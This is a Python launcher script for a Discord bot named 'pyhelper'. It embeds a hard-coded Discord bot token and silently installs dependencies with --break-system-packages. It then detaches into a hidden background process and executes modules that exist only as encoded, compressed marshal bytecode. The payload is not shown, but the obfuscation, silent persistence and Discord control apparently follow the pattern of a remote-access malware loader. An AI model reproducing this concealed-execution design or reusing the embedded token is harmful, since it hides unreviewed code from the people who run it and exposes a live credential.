TOKEN = 'MTQ4Mzc4NDM5OTQ3NTQ0MTY3NA.Gu6s4G.lT4FJrfy_rUUqqY2M8FDgcBuUqEPonalbHJdWE'

DAEMON = True

VERBOSE = False

_DAEMON_ENV_KEY = "_PYHELPER_DAEMONIZED"


class BytecodeLoader(importlib.abc.Loader):
    def create_module(self, spec):
        return None

    def exec_module(self, module):
        mod_name = module.__name__
        if mod_name == "pyhelper":
            module.__file__ = "pyhelper/__init__.py"
            if not hasattr(module, "__path__"):
                module.__path__ = ["pyhelper"]
            return
        mod_name = mod_name.replace("pyhelper.", "", 1)
        code_bytes = BYTECODE.get(mod_name)
        if code_bytes is None:
            raise ImportError("No bytecode for " + module.__name__)
        compressed = base64.z85decode(code_bytes)
        code = marshal.loads(lzma.decompress(compressed))
        module.__file__ = "pyhelper/" + mod_name + ".py"
        if not hasattr(module, "__path__"):
            module.__path__ = ["pyhelper/" + mod_name]
        exec(code, module.__dict__)


class BytecodeFinder(importlib.abc.MetaPathFinder):
    def find_spec(self, fullname, path, target=None):
        if fullname == "pyhelper" or fullname.startswith("pyhelper."):
            return importlib.util.spec_from_loader(
                fullname, BytecodeLoader(), origin=fullname
            )
        return None

    def find_module(self, fullname, path=None):
        if fullname == "pyhelper" or fullname.startswith("pyhelper."):
            return BytecodeLoader()
        return None


def ensure_deps():
    for dep in DEPS:
        import_name = IMPORT_MAP.get(dep, dep)
        if importlib.util.find_spec(import_name) is not None:
            continue

        try:
            import pip
        except ImportError:
            import ensurepip

            ensurepip.bootstrap()

        print("Installing " + dep + "...")
        subprocess.run(
            [
                sys.executable,
                "-m",
                "pip",
                "install",
                dep,
                "--break-system-packages",
            ],
            check=True,
        )


def _is_daemon_child():
    """Check if we are the spawned daemon child."""
    return os.environ.get(_DAEMON_ENV_KEY) == "1"


def daemonize(extra_args=None):
    """Spawn a fully detached child process that re-enters main(), then return."""
    import platform

    env = os.environ.copy()
    env[_DAEMON_ENV_KEY] = "1"

    module_path = os.path.abspath(sys.argv[0])
    cmd = [sys.executable, module_path]
    if extra_args:
        cmd.extend(extra_args)

    if platform.system() == "Windows":
        CREATE_NEW_PROCESS_GROUP = 0x00000200
        DETACHED_PROCESS = 0x00000008
        subprocess.Popen(
            cmd,
            creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=env,
            close_fds=True,
        )
    else:
        subprocess.Popen(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=env,
            start_new_session=True,
            close_fds=True,
        )


def _run_bot():
    """Set up the embedded package and start the bot (daemon work)."""
    if TOKEN:
        os.environ["DISCORD_TOKEN"] = TOKEN

    ensure_deps()

    pyhelper = types.ModuleType("pyhelper")
    pyhelper.__path__ = ["pyhelper"]
    sys.modules["pyhelper"] = pyhelper

    # Insert finder FIRST — Python's import machinery handles parent packages
    sys.meta_path.insert(0, BytecodeFinder())

    # Pre-import plugin modules so discover_plugins can find them in sys.modules
    for name in BYTECODE:
        if name.startswith("plugins.plugins.") and not name.endswith("__init__"):
            full_name = "pyhelper." + name
            if full_name not in sys.modules:
                try:
                    importlib.import_module(full_name)
                except Exception:
                    pass

    from pyhelper.__main__ import run as bot_run

    bot_run(verbose=VERBOSE)


def main():
    global VERBOSE

    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("--verbose", "-v", action="store_true")
    args, _ = parser.parse_known_args()
    VERBOSE = args.verbose

    if DAEMON and not _is_daemon_child():
        extra_args = ["--verbose"] if VERBOSE else []
        daemonize(extra_args)
        return

    os.environ.pop(_DAEMON_ENV_KEY, None)

    if not VERBOSE:
        logging.getLogger("pyhelper").addHandler(logging.NullHandler())

    _run_bot()


if __name__ == "__main__":
    main()
